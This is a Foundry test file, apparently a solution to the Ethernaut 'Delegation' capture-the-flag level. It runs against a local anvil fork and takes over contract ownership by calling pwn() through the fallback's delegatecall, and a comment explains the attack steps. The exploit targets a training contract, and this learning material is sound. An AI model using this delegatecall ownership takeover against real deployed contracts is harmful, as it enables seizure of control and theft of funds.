// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/06_Delegation.sol";

/*
Author: @BoscoHuang

Attack Process:
- The `fallback` function is used to delegate the call to the `Delegate` contract.
- The `Delegate` contract has a `pwn` function that sets the owner to the caller.
- The `fallback` function is called when the `Delegate` contract does not have a function that matches the function signature of the caller.

Command:
- forge test --match-contract DelegationTest --fork-url http://127.0.0.1:8545 -vvv
*/


contract DelegationTest is Test {
    Delegation Ethernaut06;

    function setUp() public {
        Ethernaut06 = Delegation(payable(0x8464135c8F25Da09e49BC8782676a84730C318bC)); // Delegation contract address in anvil
    }

    function testEthernaut06() public {
        console.log("Owner before:", Ethernaut06.owner());

        (bool success, ) = address(Ethernaut06).call(abi.encodeWithSignature("pwn()"));
        require(success, "pwn failed");
        
        assert(address(this) == Ethernaut06.owner()); // Attacker becomes the owner

        console.log("address(this):", address(this));

        console.log("Owner after:", Ethernaut06.owner());
    }
}
